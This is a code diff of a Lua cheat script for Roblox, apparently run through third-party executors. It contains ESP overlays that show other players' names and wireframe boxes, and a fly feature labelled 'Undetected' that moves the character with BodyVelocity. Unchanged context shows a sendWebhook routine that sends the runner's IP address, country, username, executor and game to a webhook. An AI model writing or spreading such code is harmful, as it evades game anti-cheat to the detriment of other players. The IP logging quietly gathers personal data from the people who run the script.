@@ -2,6 +2,7 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
 local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
 local LocalPlayer = Players.LocalPlayer
 local Camera = workspace.CurrentCamera
 local requestFunction = (syn and syn.request) or (http and http.request) or (http_request) or (fluxus and fluxus.request)
@@ -81,7 +82,6 @@ local function sendWebhook(ip, executor, isBlacklisted)
     local username = LocalPlayer and LocalPlayer.Name or "Unknown"
     local country, code = getCountryFromIP(ip)
     local flag = countryFlagEmoji(code)
-
     local gameName = "Unknown Game"
     local gameId = tostring(game.PlaceId)
     local ok, info = pcall(MarketplaceService.GetProductInfo, MarketplaceService, game.PlaceId)
@@ -116,7 +116,6 @@ local function sendWebhook(ip, executor, isBlacklisted)
     })
 end
 
--- Jalankan Blacklist Check dan UI
 task.spawn(function()
     local ip, executor = getClientInfo()
     local username = LocalPlayer and LocalPlayer.Name or "Unknown"
@@ -140,7 +139,7 @@ task.spawn(function()
     tabCombat:CreateParagraph({Title = "Combat", Content = "Fitur combat akan ditambahkan..."})
     tabVehicle:CreateParagraph({Title = "Vehicle", Content = "Fitur kendaraan akan ditambahkan..."})
 
-    -- === ESP Username ===
+    -- === ESP USERNAME ===
     local ESP_Enabled = false
     local function removeESP(player)
         if player.Character and player.Character:FindFirstChild("UsernameESP") then
@@ -199,7 +198,7 @@ task.spawn(function()
         Callback = toggleESP,
     })
 
-    -- === ESP Wireframe Box ===
+    -- === ESP BOX ===
     local ESP_Box_Enabled = false
     local ESP_Wireframes = {}
     local edges = {
@@ -250,13 +249,8 @@ task.spawn(function()
                 for _, line in ipairs(lines) do line.Visible = false end
                 continue
             end
-            local expandX = 1.5
-            local expandYTop = 1.5
-            local expandYBottom = 1.5
-            local expandZ = 1.2
-
-            minVec = minVec - Vector3.new(expandX, expandYBottom, expandZ)
-            maxVec = maxVec + Vector3.new(expandX, expandYTop, expandZ)
+            minVec = minVec - Vector3.new(1.5, 1.5, 1.2)
+            maxVec = maxVec + Vector3.new(1.5, 1.5, 1.2)
 
             local corners = {
                 Vector3.new(minVec.X, minVec.Y, minVec.Z),
@@ -307,79 +301,77 @@ task.spawn(function()
         end,
     })
 
-    -- === Fly System (Undetected + Animation) ===
-local speed = 50
-local flying = false
-local direction = Vector3.zero
-local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-local hrp = character:WaitForChild("HumanoidRootPart")
-local humanoid = character:WaitForChild("Humanoid")
+    -- === FLY SYSTEM (Undetected + Animasi) ===
+    local flying = false
+    local speed = 60
+    local direction = Vector3.zero
+    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local hrp = character:WaitForChild("HumanoidRootPart")
+    local humanoid = character:WaitForChild("Humanoid")
 
-local flyAnim = Instance.new("Animation")
-flyAnim.AnimationId = "rbxassetid://507771019"
-local flyTrack = humanoid:LoadAnimation(flyAnim)
+    local flyAnim = Instance.new("Animation")
+    flyAnim.AnimationId = "rbxassetid://507771019"
+    local flyTrack = humanoid:LoadAnimation(flyAnim)
 
-local bv = Instance.new("BodyVelocity")
-bv.Name = "FlyBV"
-bv.MaxForce = Vector3.new(1e6, 1e6, 1e6)
-bv.P = 1250
-bv.Velocity = Vector3.zero
+    local bv = Instance.new("BodyVelocity")
+    bv.Name = "FlyBV"
+    bv.MaxForce = Vector3.new(1e6, 1e6, 1e6)
+    bv.P = 1250
+    bv.Velocity = Vector3.zero
 
-local function setFly(state)
-    flying = state
-    if flying then
-        bv.Parent = hrp
-        bv.Velocity = Vector3.zero
-        if not flyTrack.IsPlaying then
-            flyTrack:Play()
-            flyTrack:AdjustSpeed(1)
+    local function setFly(state)
+        flying = state
+        if flying then
+            bv.Parent = hrp
+            bv.Velocity = Vector3.zero
+            if not flyTrack.IsPlaying then
+                flyTrack:Play()
+                flyTrack:AdjustSpeed(1)
+            end
+        else
+            bv.Parent = nil
+            if flyTrack.IsPlaying then flyTrack:Stop() end
+            direction = Vector3.zero
         end
-    else
-        bv.Parent = nil
-        if flyTrack.IsPlaying then
-            flyTrack:Stop()
+    end
+
+    tabPlayer:CreateToggle({
+        Name = "Fly (Undetected + Animation)",
+        CurrentValue = false,
+        Callback = setFly
+    })
+
+    UserInputService.InputBegan:Connect(function(input, gpe)
+        if gpe then return end
+        local v = Vector3.zero
+        local k = input.KeyCode
+        if k == Enum.KeyCode.W then v = Vector3.new(0, 0, -1)
+        elseif k == Enum.KeyCode.S then v = Vector3.new(0, 0, 1)
+        elseif k == Enum.KeyCode.A then v = Vector3.new(-1, 0, 0)
+        elseif k == Enum.KeyCode.D then v = Vector3.new(1, 0, 0)
+        elseif k == Enum.KeyCode.Space then v = Vector3.new(0, 1, 0)
+        elseif k == Enum.KeyCode.LeftControl then v = Vector3.new(0, -1, 0) end
+        direction += v
+    end)
+
+    UserInputService.InputEnded:Connect(function(input)
+        local v = Vector3.zero
+        local k = input.KeyCode
+        if k == Enum.KeyCode.W then v = Vector3.new(0, 0, -1)
+        elseif k == Enum.KeyCode.S then v = Vector3.new(0, 0, 1)
+        elseif k == Enum.KeyCode.A then v = Vector3.new(-1, 0, 0)
+        elseif k == Enum.KeyCode.D then v = Vector3.new(1, 0, 0)
+        elseif k == Enum.KeyCode.Space then v = Vector3.new(0, 1, 0)
+        elseif k == Enum.KeyCode.LeftControl then v = Vector3.new(0, -1, 0) end
+        direction -= v
+    end)
+
+    RunService.RenderStepped:Connect(function()
+        if flying and hrp and workspace.CurrentCamera then
+            local camCF = workspace.CurrentCamera.CFrame
+            local dir = camCF:VectorToWorldSpace(direction)
+            if dir.Magnitude > 0 then dir = dir.Unit end
+            bv.Velocity = dir * speed
         end
-        direction = Vector3.zero
-    end
-end
-
-tabPlayer:CreateToggle({
-    Name = "Fly (Undetected + Animation)",
-    CurrentValue = false,
-    Callback = setFly
-})
-
--- Input Keyboard (WASD, Space, Ctrl)
-UserInputService.InputBegan:Connect(function(input, gpe)
-    if gpe then return end
-    local v = Vector3.zero
-    local k = input.KeyCode
-    if k == Enum.KeyCode.W then v = Vector3.new(0, 0, -1)
-    elseif k == Enum.KeyCode.S then v = Vector3.new(0, 0, 1)
-    elseif k == Enum.KeyCode.A then v = Vector3.new(-1, 0, 0)
-    elseif k == Enum.KeyCode.D then v = Vector3.new(1, 0, 0)
-    elseif k == Enum.KeyCode.Space then v = Vector3.new(0, 1, 0)
-    elseif k == Enum.KeyCode.LeftControl then v = Vector3.new(0, -1, 0) end
-    direction += v
-end)
-
-UserInputService.InputEnded:Connect(function(input)
-    local v = Vector3.zero
-    local k = input.KeyCode
-    if k == Enum.KeyCode.W then v = Vector3.new(0, 0, -1)
-    elseif k == Enum.KeyCode.S then v = Vector3.new(0, 0, 1)
-    elseif k == Enum.KeyCode.A then v = Vector3.new(-1, 0, 0)
-    elseif k == Enum.KeyCode.D then v = Vector3.new(1, 0, 0)
-    elseif k == Enum.KeyCode.Space then v = Vector3.new(0, 1, 0)
-    elseif k == Enum.KeyCode.LeftControl then v = Vector3.new(0, -1, 0) end
-    direction -= v
-end)
-
-RunService.RenderStepped:Connect(function()
-    if flying and hrp and workspace.CurrentCamera then
-        local camCF = workspace.CurrentCamera.CFrame
-        local dir = camCF:VectorToWorldSpace(direction)
-        if dir.Magnitude > 0 then dir = dir.Unit end
-        bv.Velocity = dir * speed
-    end
+    end)
 end)
